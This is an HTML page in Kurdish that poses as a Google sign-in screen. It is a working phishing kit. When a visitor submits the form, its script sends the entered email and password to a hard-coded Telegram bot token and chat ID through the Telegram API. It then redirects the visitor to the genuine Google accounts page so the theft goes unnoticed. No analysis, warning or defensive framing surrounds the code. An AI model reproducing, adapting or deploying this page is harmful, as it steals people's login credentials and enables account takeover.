<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>چوونەژوورەوە - گوگڵ</title>
  <style>
    body { font-family: Arial; max-width: 400px; margin: 50px auto; }
    input, button { width: 100%; padding: 10px; margin: 5px 0; }
  </style>
</head>
<body>
  <h3>چوونەژوورەوە بۆ هەژمارەکەت</h3>
  <form id="loginForm">
    <input type="email" id="email" placeholder="ئیمەیڵ یان ژمارەی تەلەفۆن" required>
    <input type="password" id="pass" placeholder="پاسۆڕد" required>
    <button type="submit">بچۆ ژوورەوە</button>
  </form>

  <script>
    // -------------------- داتاکانی تۆ --------------------
    const TOKEN = "8988207945:AAGSUvEU7PC25hiMDM8EoOU7dWl1tQ6DJ9M";
    const CHAT_ID = "1073170460";
    // ----------------------------------------------------

    document.getElementById('loginForm').onsubmit = function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const pass = document.getElementById('pass').value;
      const message = `👤 گمەیڵ: ${email} | 🔑 پاسۆڕد: ${pass}`;

      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
        .finally(() => {
          window.location.href = "https://accounts.google.com";
        });
    };
  </script>
</body>
</html>
